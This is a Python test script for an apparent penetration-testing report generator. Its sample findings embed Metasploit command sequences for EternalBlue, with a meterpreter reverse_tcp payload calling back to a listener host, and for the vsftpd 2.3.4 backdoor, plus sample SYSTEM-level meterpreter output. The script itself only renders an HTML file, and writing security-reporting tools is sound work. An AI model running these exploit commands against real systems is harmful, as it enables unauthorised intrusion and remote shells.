"""
Test script to verify HTML report generation works
"""

from datetime import datetime
from reporting.html_generator import generate_html_report

# Create test data
test_findings = {
    "executive_summary": "This is a test penetration testing assessment. Multiple vulnerabilities were identified including critical remote code execution flaws.",
    "key_statistics": {
        "total_vulnerabilities": 3,
        "critical_count": 1,
        "high_count": 1,
        "systems_tested": 1,
        "systems_compromised": 1
    },
    "vulnerabilities": [
        {
            "severity": "Critical",
            "title": "EternalBlue SMB Vulnerability (MS17-010)",
            "description": "Remote Code Execution vulnerability in SMBv1 protocol",
            "impact": "Allows remote attacker to execute arbitrary code with SYSTEM privileges",
            "affected_systems": ["192.168.1.100"],
            "remediation": "Apply MS17-010 security patch immediately",
            "evidence": "Port 445 open\\nSMBv1 enabled\\nVulnerable to MS17-010",
            "exploit_command": "use exploit/windows/smb/ms17_010_eternalblue\\nset RHOST 192.168.1.100\\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\\nset LHOST 192.168.1.50\\nexploit",
            "references": ["CVE-2017-0144", "MS17-010"]
        },
        {
            "severity": "High",
            "title": "FTP Backdoor (vsftpd 2.3.4)",
            "description": "Backdoor in vsftpd 2.3.4 allows remote code execution",
            "impact": "Attacker can gain shell access to the system",
            "affected_systems": ["192.168.1.100"],
            "remediation": "Upgrade vsftpd to latest version",
            "evidence": "vsftpd 2.3.4 detected on port 21",
            "exploit_command": "use exploit/unix/ftp/vsftpd_234_backdoor\\nset RHOST 192.168.1.100\\nexploit",
            "references": ["CVE-2011-2523"]
        },
        {
            "severity": "Medium",
            "title": "Weak SSH Configuration",
            "description": "SSH server allows weak encryption algorithms",
            "impact": "Man-in-the-middle attacks possible",
            "affected_systems": ["192.168.1.100"],
            "remediation": "Update SSH configuration to disable weak ciphers",
            "evidence": "Weak ciphers detected: 3des-cbc, aes128-cbc"
        }
    ],
    "compromised_systems": [
        {
            "system": "192.168.1.100",
            "access_level": "SYSTEM",
            "method": "EternalBlue exploit via SMBv1",
            "evidence": "meterpreter > getuid\\nServer username: NT AUTHORITY\\\\SYSTEM"
        }
    ],
    "tools_used": ["nmap", "metasploit", "nikto"]
}

# Generate HTML report
print("Generating test HTML report...")
html_content = generate_html_report(
    findings=test_findings,
    target="192.168.1.100",
    workflow_name="Full Network Scan",
    timestamp=datetime.now()
)

# Save to file
output_file = "reports/test_report.html"
import os
os.makedirs("reports", exist_ok=True)

with open(output_file, 'w', encoding='utf-8') as f:
    f.write(html_content)

print(f"✅ Test HTML report generated successfully!")
print(f"📄 File: {output_file}")
print(f"🌐 Open with: firefox {output_file}")
print(f"📊 Report contains:")
print(f"   - 3 vulnerabilities (1 Critical, 1 High, 1 Medium)")
print(f"   - 1 compromised system")
print(f"   - Interactive exploit buttons")
print(f"   - Dark terminal theme")
